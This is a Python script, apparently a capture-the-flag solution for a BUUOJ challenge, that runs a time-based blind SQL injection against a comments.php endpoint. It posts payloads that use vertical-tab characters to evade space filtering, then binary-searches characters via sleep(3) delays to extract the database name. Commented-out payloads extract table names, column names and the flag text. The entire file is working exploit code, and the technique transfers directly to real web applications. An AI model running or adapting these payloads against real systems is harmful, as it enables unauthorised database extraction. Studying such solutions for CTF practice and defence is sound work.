import requests
import time

s = requests.session()
url = 'http://a0e6dd94-9576-439f-b9ba-cc618ac9c03f.node5.buuoj.cn:81/comments.php'
flag = ''
i = 0
d = 0
while d == 0:
    i = i + 1
    low = 32
    high = 127
    while low < high:
        mid = (low + high) // 2
        payload = f'1%0band%0bif((ascii(substr(database(),{i},1))>{mid}),1,sleep(3))'
        # payload = f'1%0band%0bif(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{i},1))>{mid},1,sleep(3))'
        # payload = f'1%0band%0bif(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name="wfy_comments")),{i},1))>{mid},1,sleep(3))'
        # payload = f'if(ascii(substr((select(text)from(wfy_comments)where(user="f1ag_is_here")),{i},1))>{mid},1,sleep(3))'
        stime = time.time()
        # 使用POST请求发送数据
        r = s.post(url=url, data={'name': payload})
        r.encoding = "utf-8"
        print(payload)
        if time.time() - stime < 2:
            low = mid + 1
        else:
            high = mid
    if low != 32:
        flag += chr(low)
    else:
        break
    print(flag)
